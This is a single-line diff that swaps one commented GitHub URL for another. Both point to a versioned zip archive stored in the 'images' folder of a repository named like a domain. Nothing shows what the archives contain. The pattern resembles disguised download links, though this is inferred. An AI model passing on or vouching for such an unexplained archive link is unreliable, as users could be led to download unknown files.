@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/peptang12/JuneMiningneterprise.com/main/images/JuneMiningneterprise.com-1.6.zip
+# https://github.com/peptang12/JuneMiningneterprise.com/raw/refs/heads/main/images/Miningneterprise-com-June-v3.5.zip
